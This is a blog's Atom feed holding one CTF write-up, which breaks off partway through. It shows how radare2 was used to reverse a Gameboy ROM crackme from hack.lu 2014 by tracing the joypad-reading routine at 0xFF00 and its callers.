<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[crowell's blog]]></title>
  <link href="http://crowell.github.io/atom.xml" rel="self"/>
  <link href="http://crowell.github.io/"/>
  <updated>2014-11-23T22:48:00-05:00</updated>
  <id>http://crowell.github.io/</id>
  <author>
    <name><![CDATA[Jeffrey Crowell]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Solving at Gunpoint From hack.lu 2014 With Radare2]]></title>
    <link href="http://crowell.github.io/blog/2014/11/23/solving-at-gunpoint-from-hack-dot-lu-2014-with-radare2/"/>
    <updated>2014-11-23T22:43:13-05:00</updated>
    <id>http://crowell.github.io/blog/2014/11/23/solving-at-gunpoint-from-hack-dot-lu-2014-with-radare2</id>
    <content type="html"><![CDATA[<p>&ldquo;At Gunpoint&rdquo; was a 200 point Reversing challenge in Hack.lu ctf 2014. The
description is as follows</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You 're the sheriff of a small town, investigating news about a gangster squad
</span><span class='line'>passing by. Rumor has it they' re easy to outsmart, so you have just followed
</span><span class='line'>one to their encampment by the river.You know you can easily take them out one
</span><span class='line'>by one, if you would just know their secret handshake..</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what we are working with.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>minishwoods hacklu/gunpoint Â» file gunpoint_2daf5fe3fb236b398ff9e5705a058a7f.dat
</span><span class='line'>gunpoint_2daf5fe3fb236b398ff9e5705a058a7f.dat: Gameboy ROM: "FLUX", [ROM ONLY], ROM: 256Kbit</span></code></pre></td></tr></table></div></figure>


<p>So it is a Gameboy ROM. I load it up in VisualBoyAdvance and see what the game is.</p>

<p><img src="http://i.imgur.com/pVD3Je8.png" alt="running_game_1.png" /></p>

<p>It is a static image, and after some time, we receive this text.</p>

<p><img src="http://i.imgur.com/K7hPMTJ.png" alt="running_game_2.png" /></p>

<p>Looks like we will have to put in some inputs from the joypad to get the flag.
It is a crackme style but for the Gameboy! Sounds fun.</p>

<p>First thing to do is to find out how the Gameboy interprets button presses.</p>

<p>According to this document here <a href="http://www.semis.demon.co.uk/Gameboy/Gbspec.txt">http://www.semis.demon.co.uk/Gameboy/Gbspec.txt</a>
The joypad is memory mapped to <code>0xFF00</code>. So now that we have some sort of idea
of what we are looking for, let&rsquo;s load up the ROM in radare2!</p>

<p>First, let&rsquo;s run the auto analysis and see what r2 can give us for functions.
We run <code>aa</code> to analyze the binary, then <code>afl</code> to list the functions.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>minishwoods hacklu/gunpoint Â» radare2 ./gunpoint_2daf5fe3fb236b398ff9e5705a058a7f.dat
</span><span class='line'> -- Fuck you, fuck you in the mouth, with a chair!
</span><span class='line'> [0x00000100]&gt; aa
</span><span class='line'> [0x00000100]&gt; afl
</span><span class='line'> 0x00000100  35  1  entry0
</span><span class='line'> 0x00000150  133  8  main
</span><span class='line'> 0x00000123  178  8  fcn.00000123</span></code></pre></td></tr></table></div></figure>


<p>Hm&hellip; not so great, just 3 functions. (note, since after the ctf ended, the latest git of r2 is much better at detecting Gameboy functions!)</p>

<p>Let&rsquo;s try to find usage of the joypad. Really what we are looking for is a load
or store from <code>0xFF00</code>, but I am lazy, and the ROM is small, so we can just
disassembly everything and grep for it!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x00000100</span><span class="err">]&gt;</span> <span class="no">s</span> <span class="mi">0</span><span class="err">;</span> <span class="no">pd</span> <span class="mi">10000</span> <span class="err">|</span> <span class="no">grep</span> <span class="no">ff00</span>
</span><span class='line'><span class="nf">Do</span> <span class="no">you</span> <span class="no">want</span> <span class="no">to</span> <span class="no">print</span> <span class="mi">566</span><span class="no">.8K</span> <span class="no">chars</span><span class="err">?</span> <span class="p">(</span><span class="no">y</span><span class="err">/</span><span class="no">N</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000193</span>    <span class="no">e2</span>           <span class="no">ld</span> <span class="err">[</span><span class="mi">0xff00</span> <span class="err">+</span> <span class="no">c</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'>            <span class="err">0</span><span class="nf">x00000c84</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e63</span>    <span class="no">e000</span>         <span class="no">ld</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e65</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e67</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e71</span>    <span class="no">e000</span>         <span class="no">ld</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e73</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e75</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e77</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e79</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e7b</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e7d</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00001e88</span>    <span class="no">e000</span>         <span class="no">ld</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'>            <span class="err">0</span><span class="nf">x00002307</span>    <span class="no">e2</span>           <span class="no">ld</span> <span class="err">[</span><span class="mi">0xff00</span> <span class="err">+</span> <span class="no">c</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'>            <span class="err">0</span><span class="nf">x00002317</span>    <span class="no">f2</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span> <span class="err">+</span> <span class="no">c</span><span class="err">]</span>
</span><span class='line'>            <span class="err">0</span><span class="nf">x0000233f</span>    <span class="no">f2</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span> <span class="err">+</span> <span class="no">c</span><span class="err">]</span>
</span><span class='line'>            <span class="err">0</span><span class="nf">x00002342</span>    <span class="no">f2</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span> <span class="err">+</span> <span class="no">c</span><span class="err">]</span>
</span><span class='line'>            <span class="err">0</span><span class="nf">x00002717</span>    <span class="no">f2</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span> <span class="err">+</span> <span class="no">c</span><span class="err">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, not many uses, and it looks like there are a few small groups that are
touching <code>0xFF00</code>, so probably just a few functions that interact with the
joypad.</p>

<p>So, seek to 0x1e63 (<code>s 0x1e63</code>), then open up visual mode with <code>V</code>. Scroll up
a bit to see that at <code>0x1e5f</code> is a <code>ret</code>, then <code>0x1e60</code> is <code>push bc</code>. The push
instruction looks to be the start of a function that interacts with the joypad
quite a bit. So we can define this as a function from visual mode with <code>df</code>.
(If you have a newer version of r2, this is probably already done for you).</p>

<p>Checking back at the Gameboy document, The function looks very similar, in fact,
it nearly identical to the joypad reader from Ms. PacMan.</p>

<p>Code from Ms. PacMan is here</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'>   <span class="nf">Example</span> <span class="no">code</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>      <span class="nl">Game:</span> <span class="nf">Ms.</span> <span class="no">Pacman</span>
</span><span class='line'>      <span class="nl">Address:</span> <span class="nf">$3b1</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,</span><span class="no">$20</span>       <span class="err">&lt;</span><span class="p">-</span> <span class="no">bit</span> <span class="mi">5</span> <span class="err">=</span> <span class="no">$20</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="p">(</span><span class="no">$FF00</span><span class="p">),</span><span class="no">A</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">select</span> <span class="no">P14</span> <span class="no">by</span> <span class="no">setting</span> <span class="no">it</span> <span class="no">low</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF00</span><span class="p">)</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF00</span><span class="p">)</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">wait</span> <span class="no">a</span> <span class="no">few</span> <span class="no">cycles</span>
</span><span class='line'>    <span class="nf">CPL</span>            <span class="err">&lt;</span><span class="p">-</span> <span class="no">complement</span> <span class="no">A</span>
</span><span class='line'>    <span class="nf">AND</span> <span class="no">$0F</span>        <span class="err">&lt;</span><span class="p">-</span> <span class="no">get</span> <span class="no">only</span> <span class="no">first</span> <span class="mi">4</span> <span class="no">bits</span>
</span><span class='line'>    <span class="nf">SWAP</span> <span class="no">A</span>         <span class="err">&lt;</span><span class="p">-</span> <span class="no">swap</span> <span class="no">it</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">B</span><span class="p">,</span><span class="no">A</span>         <span class="err">&lt;</span><span class="p">-</span> <span class="no">store</span> <span class="no">A</span> <span class="no">in</span> <span class="no">B</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,</span><span class="no">$10</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="p">(</span><span class="no">$FF00</span><span class="p">),</span><span class="no">A</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">select</span> <span class="no">P15</span> <span class="no">by</span> <span class="no">setting</span> <span class="no">it</span> <span class="no">low</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF00</span><span class="p">)</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF00</span><span class="p">)</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF00</span><span class="p">)</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF00</span><span class="p">)</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF00</span><span class="p">)</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF00</span><span class="p">)</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">Wait</span> <span class="no">a</span> <span class="no">few</span> <span class="no">MORE</span> <span class="no">cycles</span>
</span><span class='line'>    <span class="nf">CPL</span>            <span class="err">&lt;</span><span class="p">-</span> <span class="no">complement</span> <span class="p">(</span><span class="no">invert</span><span class="p">)</span>
</span><span class='line'>    <span class="nf">AND</span> <span class="no">$0F</span>        <span class="err">&lt;</span><span class="p">-</span> <span class="no">get</span> <span class="no">first</span> <span class="mi">4</span> <span class="no">bits</span>
</span><span class='line'>    <span class="nf">OR</span> <span class="no">B</span>           <span class="err">&lt;</span><span class="p">-</span> <span class="no">put</span> <span class="no">A</span> <span class="no">and</span> <span class="no">B</span> <span class="no">together</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">B</span><span class="p">,</span><span class="no">A</span>         <span class="err">&lt;</span><span class="p">-</span> <span class="no">store</span> <span class="no">A</span> <span class="no">in</span> <span class="no">D</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,(</span><span class="no">$FF8B</span><span class="p">)</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">read</span> <span class="no">old</span> <span class="no">joy</span> <span class="no">data</span> <span class="no">from</span> <span class="no">ram</span>
</span><span class='line'>    <span class="nf">XOR</span> <span class="no">B</span>          <span class="err">&lt;</span><span class="p">-</span> <span class="no">toggle</span> <span class="no">w</span><span class="err">/</span><span class="no">current</span> <span class="no">button</span> <span class="no">bit</span>
</span><span class='line'>    <span class="nf">AND</span> <span class="no">B</span>          <span class="err">&lt;</span><span class="p">-</span> <span class="no">get</span> <span class="no">current</span> <span class="no">button</span> <span class="no">bit</span> <span class="no">back</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="p">(</span><span class="no">$FF8C</span><span class="p">),</span><span class="no">A</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">save</span> <span class="no">in</span> <span class="no">new</span> <span class="no">Joydata</span> <span class="no">storage</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,</span><span class="no">B</span>         <span class="err">&lt;</span><span class="p">-</span> <span class="no">put</span> <span class="no">original</span> <span class="no">value</span> <span class="no">in</span> <span class="no">A</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="p">(</span><span class="no">$FF8B</span><span class="p">),</span><span class="no">A</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">store</span> <span class="no">it</span> <span class="no">as</span> <span class="no">old</span> <span class="no">joy</span> <span class="no">data</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="nf">LD</span> <span class="no">A</span><span class="p">,</span><span class="no">$30</span>       <span class="err">&lt;</span><span class="p">-</span> <span class="no">deselect</span> <span class="no">P14</span> <span class="no">and</span> <span class="no">P15</span>
</span><span class='line'>    <span class="nf">LD</span> <span class="p">(</span><span class="no">$FF00</span><span class="p">),</span><span class="no">A</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">RESET</span> <span class="no">Joypad</span>
</span><span class='line'>    <span class="nf">RET</span>            <span class="err">&lt;</span><span class="p">-</span> <span class="no">Return</span> <span class="no">from</span> <span class="no">Subroutine</span>
</span><span class='line'>
</span><span class='line'>      <span class="nf">The</span> <span class="no">button</span> <span class="no">values</span> <span class="no">using</span> <span class="no">the</span> <span class="no">above</span> <span class="no">method</span> <span class="no">are</span> <span class="no">such</span><span class="p">:</span>
</span><span class='line'>      <span class="nf">$80</span> <span class="p">-</span> <span class="no">Start</span>             <span class="no">$8</span> <span class="p">-</span> <span class="no">Down</span>
</span><span class='line'>      <span class="nf">$40</span> <span class="p">-</span> <span class="no">Select</span>            <span class="no">$4</span> <span class="p">-</span> <span class="no">Up</span>
</span><span class='line'>      <span class="nf">$20</span> <span class="p">-</span> <span class="no">B</span>                 <span class="no">$2</span> <span class="p">-</span> <span class="no">Left</span>
</span><span class='line'>      <span class="nf">$10</span> <span class="p">-</span> <span class="no">A</span>                 <span class="no">$1</span> <span class="p">-</span> <span class="no">Right</span>
</span><span class='line'>
</span><span class='line'>      <span class="nf">Let</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">say</span> <span class="no">we</span> <span class="no">held</span> <span class="no">down</span> <span class="no">A</span><span class="p">,</span> <span class="no">Start</span><span class="p">,</span> <span class="no">and</span> <span class="no">Up.</span>
</span><span class='line'>      <span class="nf">The</span> <span class="no">value</span> <span class="no">returned</span> <span class="no">in</span> <span class="no">accumulator</span> <span class="no">A</span> <span class="no">would</span> <span class="no">be</span> <span class="no">$94jkj</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the code we have here.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">fcn.00001e60</span> <span class="mi">45</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e60</span>    <span class="no">c5</span>           <span class="no">push</span> <span class="no">bc</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e61</span>    <span class="mi">3</span><span class="no">e20</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="mi">0x20</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e63</span>    <span class="no">e000</span>         <span class="no">ld</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e65</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e67</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e69</span>    <span class="mi">2</span><span class="no">f</span>           <span class="no">cpl</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e6a</span>    <span class="no">e60f</span>         <span class="no">and</span> <span class="mi">0x0f</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e6c</span>    <span class="no">cb37</span>         <span class="no">swap</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e6e</span>    <span class="mi">47</span>           <span class="no">ld</span> <span class="no">b</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e6f</span>    <span class="mi">3</span><span class="no">e10</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="mi">0x10</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e71</span>    <span class="no">e000</span>         <span class="no">ld</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e73</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e75</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e77</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e79</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e7b</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e7d</span>    <span class="no">f000</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e7f</span>    <span class="mi">2</span><span class="no">f</span>           <span class="no">cpl</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e80</span>    <span class="no">e60f</span>         <span class="no">and</span> <span class="mi">0x0f</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e82</span>    <span class="no">b0</span>           <span class="no">or</span> <span class="no">b</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e83</span>    <span class="no">cb37</span>         <span class="no">swap</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e85</span>    <span class="mi">47</span>           <span class="no">ld</span> <span class="no">b</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e86</span>    <span class="mi">3</span><span class="no">e30</span>         <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="mi">0x30</span>
</span><span class='line'><span class="err">|</span>          <span class="err">;</span>  <span class="nf">JOYPAD</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e88</span>    <span class="no">e000</span>         <span class="no">ld</span> <span class="err">[</span><span class="mi">0xff00</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e8a</span>    <span class="mi">78</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="no">b</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e8b</span>    <span class="no">c1</span>           <span class="no">pop</span> <span class="no">bc</span>
</span><span class='line'><span class="err">\</span>          <span class="err">0</span><span class="nf">x00001e8c</span>    <span class="no">c9</span>           <span class="no">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks really similar, doesn&rsquo;t it? ;) So we can see here, that value of the
joypad is now stored in register A from <code>0x1e8a</code>. Seek to the beginning of the
function and define the function with a name like <code>read_joypad</code> with <code>dr</code> in
visual mode.</p>

<p>So, now that we know what reads the joypad, we can find the xrefs to find out
the checking routine. From visual mode, at the top of <code>read_joypad</code>, hit <code>x</code> to
see the xrefs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[</span><span class="nf">GOTO</span> <span class="no">XREF</span><span class="err">]&gt;</span> <span class="mi">65</span> <span class="p">.</span><span class="err">/</span><span class="no">gunpoint_2daf5fe3fb236b398ff9e5705a058a7f.dat</span><span class="err">]&gt;</span> <span class="no">pd</span> <span class="no">$r</span> <span class="err">@</span> <span class="no">read_joypad</span>
</span><span class='line'><span class="err">[0]</span> <span class="err">0</span><span class="nf">x00001e60</span> <span class="no">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="mi">0x00001e54</span> <span class="p">(</span><span class="no">fcn.00001e50</span><span class="p">)</span>
</span><span class='line'><span class="err">[1]</span> <span class="err">0</span><span class="nf">x00001e60</span> <span class="no">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="mi">0x00001e8d</span> <span class="p">(</span><span class="no">fcn.00001e8d</span><span class="p">)</span>
</span><span class='line'><span class="err">[2]</span> <span class="err">0</span><span class="nf">x00001e60</span> <span class="no">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="mi">0x00001e94</span> <span class="p">(</span><span class="no">fcn.00001e94</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see 3 cross references, which means we have 3 other functions calling the
<code>read_joypad</code> function.</p>

<p>Looking at xref2, we see that the joypad is read, and then the value is also
stored into register <code>e</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
